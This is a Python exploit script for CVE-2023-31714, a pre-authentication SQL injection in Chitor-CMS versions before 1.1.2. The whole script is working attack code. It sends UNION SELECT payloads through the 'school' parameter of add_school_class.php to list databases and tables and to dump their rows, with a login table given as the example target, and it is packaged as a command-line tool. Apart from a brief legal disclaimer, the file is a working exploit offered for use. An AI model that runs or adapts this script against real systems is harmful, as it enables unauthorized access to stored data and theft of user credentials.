#!/usr/bin/python3

###########################################################
#                                                         # 
#  CVE-2023-31714                                         #
#  Chitor-CMS < 1.1.2 Pre-Auth SQL Injection              #
#  Vulnerability found the 2023/04/09                     #
#  Exploit by msd0pe                                      #
#  Project: https://github.com/waqaskanju/Chitor-CMS      #
#  My Github: https://github.com/msd0pe-1                 #
#  Became a Post-Auth SQL Injection since 5f76192 commit  #
#                                                         #
###########################################################

__description__ = 'Chitor-CMS < 1.1.2 Pre-Auth SQL Injection.'
__author__ = 'msd0pe'
__version__ = '1.0'
__date__ = '2023/04/09'

class bcolors:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    OCRA = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class infos:
    INFO = "[" + bcolors.OCRA + bcolors.BOLD + "?" + bcolors.ENDC + bcolors.ENDC + "] "
    ERROR = "[" + bcolors.RED + bcolors.BOLD + "X" + bcolors.ENDC + bcolors.ENDC + "] "
    GOOD = "[" + bcolors.GREEN + bcolors.BOLD + "+" + bcolors.ENDC + bcolors.ENDC + "] "
    PROCESS = "[" + bcolors.BLUE + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.ENDC + "] "

import re
import requests
import optparse
from prettytable import PrettyTable

def DumpTable(url, database, table):
    header = {"User-Agent": "5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
    x = PrettyTable()
    columns = []
    for i in range(0,100):
        payload = "/add_school_class.php?school=-4577' UNION ALL SELECT (SELECT CONCAT(0x71766a7071%2CIFNULL(CAST(column_name AS NCHAR)%2C0x20)%2C0x7170627671) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = \"" + table + "\" LIMIT " + str(i) + "%2C1)-- -&class_name=TEST&pass_percentage=33.3&submit=Add Class to School"
        u = requests.get(url + payload, headers=header)
        try:
            r = re.findall("qvjpq(.*?)qpbvq",u.text)
            if r == "[]":
                pass
            else:
                columns.append(r[0])
                pass
        except:
            pass
    x.field_names = columns
    for i in range(1,20): ## NUMBER OF ID TO TEST
        row = []
        for column in columns:
            payload = "/add_school_class.php?school=-8917%27 UNION ALL SELECT CONCAT%280x71766a7071%2CJSON_ARRAYAGG%28CONCAT_WS%280x666f7668746d%2C " + column + "%29%29%2C0x7170627671%29 FROM " + database + "." + table + " WHERE " + columns[0] + "=" + str(i) + "-- -&class_name=TEST&pass_percentage=33.3&submit=Add Class to School"
            u = requests.get(url + payload, headers=header)
            try:
                r = re.findall("\[(.*?)\]", u.text)
                r = r[0].replace("fovhtm",",").strip("\"")
                r = r.split(",")
                if r == []:
                    pass
                else:
                    row.append(r[0])
            except:
                pass
        try:
             x.add_rows([row])
        except ValueError:
            pass
    print(x)

def ListTables(url, database):
    header = {"User-Agent": "5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
    x = PrettyTable()
    x.field_names = ["TABLES"]
    for i in range(0,100):
        payload = "/add_school_class.php?school=-4577' UNION ALL SELECT (SELECT CONCAT(0x71766a7071%2CIFNULL(CAST(table_name AS NCHAR)%2C0x20)%2C0x7170627671) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x" + str(database).encode('utf-8').hex() + ") LIMIT " + str(i) + "%2C1)-- -&class_name=TEST&pass_percentage=33.3&submit=Add Class to School"
        u = requests.get(url + payload, headers=header)
        try:
            r = re.findall("qvjpq(.*?)qpbvq",u.text)
            if r == []:
                break
            else:
                x.add_row([r[0]])
        except:
            pass
    print(x)

def ListDatabases(url):
    header = {"User-Agent": "5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}
    x = PrettyTable()
    x.field_names = ["DATABASES"]
    for i in range(0,100):
        payload = "/add_school_class.php?school=-4577' UNION ALL SELECT (SELECT CONCAT(0x71766a7071%2CIFNULL(CAST(schema_name AS NCHAR)%2C0x20)%2C0x7170627671) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT " + str(i) + "%2C1)-- -&class_name=TEST&pass_percentage=33.3&submit=Add Class to School"
        u = requests.get(url + payload, headers=header)
        try:
            r = re.findall("qvjpq(.*?)qpbvq",u.text)
            if r == []:
                break
            else:
                x.add_row([r[0]])
        except:
            pass
    print(x)

def Main():
    Menu = optparse.OptionParser(usage='python %prog [options]', version='%prog ' + __version__)
    Menu.add_option('-u', '--url', type="str", dest="url", help='target url')
    Menu.add_option('--dbs', action="store_true", dest="l_databases", help='list databases')
    Menu.add_option('-D', '--db', type="str", dest="database", help='select a database')
    Menu.add_option('--tables', action="store_true", dest="l_tables", help='list tables')
    Menu.add_option('-T', '--table', type="str", dest="table", help='select a table')
    Menu.add_option('--dump', action="store_true", dest="dump", help='dump the content')
    (options, args) = Menu.parse_args()

    Examples = optparse.OptionGroup(Menu, "Examples", """python3 chitor1.0.py -u http://127.0.0.1 --dbs
                                                         python3 chitor1.0.py -u http://127.0.0.1 -D chitor_db --tables
                                                         python3 chitor1.0.py -u http://127.0.0.1 -D chitor_db -T login --dump
    """)
    Menu.add_option_group(Examples)

    if len(args) != 0 or options == {'url': None, 'l_databases': None, 'database': None, 'l_tables': None, 'table': None, 'dump': None}:
        Menu.print_help()
        print('')
        print('  %s' % __description__)
        print('  Source code put in public domain by ' + bcolors.PURPLE + bcolors.BOLD + 'msd0pe' + bcolors.ENDC + bcolors.ENDC + ',' + bcolors.RED + bcolors.BOLD + 'no Copyright' + bcolors.ENDC + bcolors.ENDC)
        print('  Any malicious or illegal activity may be punishable by law')
        print('  Use at your own risk')

    elif len(args) == 0:
        try:
            if options.url != None:
                if options.l_databases != None:
                    ListDatabases(options.url)
                if options.database != None:
                    if options.l_tables != None:
                        ListTables(options.url, options.database)
                    if options.table != None:
                        if options.dump != None:
                            DumpTable(options.url, options.database, options.table)
        except:
            print("Unexpected error")

if __name__ == '__main__':
    try:
        Main()

    except KeyboardInterrupt:
        print()
        print(infos.PROCESS + "Exiting...")
        print()
        exit(1)
